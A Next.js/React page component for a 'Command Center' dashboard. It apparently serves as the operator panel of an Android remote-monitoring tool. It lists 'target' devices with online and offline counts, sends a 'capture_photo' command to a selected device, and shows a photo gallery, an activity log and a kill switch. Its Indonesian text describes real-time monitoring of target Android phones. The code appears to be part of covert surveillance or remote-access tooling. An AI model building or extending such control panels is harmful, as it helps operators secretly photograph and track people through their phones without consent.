'use client';

import { useEffect, useMemo, useState } from 'react';
import TargetList from '@/components/TargetList';
import PhotoGallery from '@/components/PhotoGallery';
import ActivityLog from '@/components/ActivityLog';
import { KillSwitch } from '@/components/dashboard/KillSwitch';
import { subscribeToTargets, sendCommand } from '@/services/targetService';
import { Target } from '@/types/target';
import { Device } from '@/types';
import { Shield, Wifi, WifiOff, Users, Activity } from 'lucide-react';

export default function DashboardPage() {
  const [targets, setTargets] = useState<Target[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedTargetId, setSelectedTargetId] = useState<string | null>(null);
  const [busyTargetId, setBusyTargetId] = useState<string | null>(null);

  useEffect(() => {
    const unsubscribe = subscribeToTargets((incomingTargets: Target[] = []) => {
      setTargets(incomingTargets);
      setLoading(false);
    });

    return () => unsubscribe();
  }, []);

  useEffect(() => {
    if (!selectedTargetId && targets.length > 0) {
      setSelectedTargetId(targets[0].id);
    }
  }, [targets, selectedTargetId]);

  const selectedTarget = useMemo(
    () => targets.find((target) => target.id === selectedTargetId) ?? targets[0] ?? null,
    [selectedTargetId, targets]
  );

  const handleCapture = async (deviceId: string) => {
    setBusyTargetId(deviceId);
    try {
      await sendCommand(deviceId, 'capture_photo');
    } finally {
      setBusyTargetId(null);
    }
  };

  const onlineCount = useMemo(
    () => targets.filter((target) => target.status?.toUpperCase() === 'ONLINE').length,
    [targets]
  );

  const offlineCount = useMemo(() => targets.length - onlineCount, [targets.length, onlineCount]);

  // Convert Target to Device type for KillSwitch
  const devicesForKillSwitch = useMemo(() => {
    return targets.map(t => ({
      id: t.id,
      model: t.deviceInfo?.model || 'Unknown',
      status: (t.status?.toLowerCase() || 'offline') as any,
      battery: t.battery || 0,
      android_version: t.deviceInfo?.os || 'N/A',
      ip_address: t.ip || '0.0.0.0',
      last_ping: t.last_ping || 0
    })) as Device[];
  }, [targets]);

  return (
    <div className="space-y-6">
      {/* ── Header Section ── */}
      <section className="relative overflow-hidden rounded-2xl border border-white/[0.06] bg-gradient-to-br from-slate-900/80 via-slate-900/60 to-emerald-950/20 p-6 lg:p-8 backdrop-blur-xl">
        {/* Decorative gradient blob */}
        <div className="absolute -top-24 -right-24 w-64 h-64 bg-emerald-500/[0.07] rounded-full blur-3xl pointer-events-none" />
        <div className="absolute -bottom-16 -left-16 w-48 h-48 bg-cyan-500/[0.05] rounded-full blur-3xl pointer-events-none" />
        
        <div className="relative flex flex-col lg:flex-row justify-between items-start gap-6">
          <div className="space-y-3">
            <div className="flex items-center gap-2">
              <div className="flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20">
                <Activity size={12} className="text-emerald-400" />
                <span className="text-[10px] font-semibold text-emerald-400 uppercase tracking-wider">Live Monitor</span>
              </div>
            </div>
            <h1 className="text-3xl lg:text-4xl font-bold text-white tracking-tight">
              Command Center
            </h1>
            <p className="max-w-xl text-sm text-slate-400 leading-relaxed">
              Monitor perangkat target Android secara real-time. Pantau status, foto, dan aktivitas dalam satu dashboard.
            </p>
          </div>
          <div className="w-full lg:w-auto shrink-0">
            <KillSwitch devices={devicesForKillSwitch} />
          </div>
        </div>

        {/* ── Stat Cards ── */}
        <div className="relative mt-8 grid gap-3 sm:grid-cols-3">
          <StatCard
            icon={<Users size={18} />}
            label="Total Targets"
            value={targets.length}
            color="slate"
          />
          <StatCard
            icon={<Wifi size={18} />}
            label="Online"
            value={onlineCount}
            color="emerald"
          />
          <StatCard
            icon={<WifiOff size={18} />}
            label="Offline"
            value={offlineCount}
            color="red"
          />
        </div>
      </section>

      {/* ── 3-Column Content Grid ── */}
      <div className="grid gap-6 xl:grid-cols-[2.2fr_1.4fr_1fr]">
        <TargetList
          targets={targets}
          loading={loading}
          selectedTargetId={selectedTargetId ?? undefined}
          onSelect={(deviceId) => setSelectedTargetId(deviceId)}
          onCapture={handleCapture}
          busyTargetId={busyTargetId}
        />

        <PhotoGallery 
          targetId={selectedTarget?.id} 
          targets={targets}
          onTargetChange={(deviceId) => setSelectedTargetId(deviceId)}
        />

        <ActivityLog targetId={selectedTarget?.id} />
      </div>
    </div>
  );
}

/* ── Inline Stat Card ── */
function StatCard({
  icon,
  label,
  value,
  color,
}: {
  icon: React.ReactNode;
  label: string;
  value: number;
  color: 'slate' | 'emerald' | 'red';
}) {
  const colorMap = {
    slate: {
      iconBg: 'bg-slate-500/10',
      iconText: 'text-slate-400',
      value: 'text-white',
    },
    emerald: {
      iconBg: 'bg-emerald-500/10',
      iconText: 'text-emerald-400',
      value: 'text-emerald-400',
    },
    red: {
      iconBg: 'bg-red-500/10',
      iconText: 'text-red-400',
      value: 'text-red-400',
    },
  };

  const c = colorMap[color];

  return (
    <div className="flex items-center gap-4 rounded-xl border border-white/[0.06] bg-white/[0.02] p-4 backdrop-blur-sm hover:bg-white/[0.04] transition-colors">
      <div className={`flex items-center justify-center w-10 h-10 rounded-lg ${c.iconBg}`}>
        <span className={c.iconText}>{icon}</span>
      </div>
      <div>
        <p className="text-[11px] uppercase tracking-wider text-slate-500 font-medium">{label}</p>
        <p className={`text-2xl font-bold ${c.value} mt-0.5`}>{value}</p>
      </div>
    </div>
  );
}
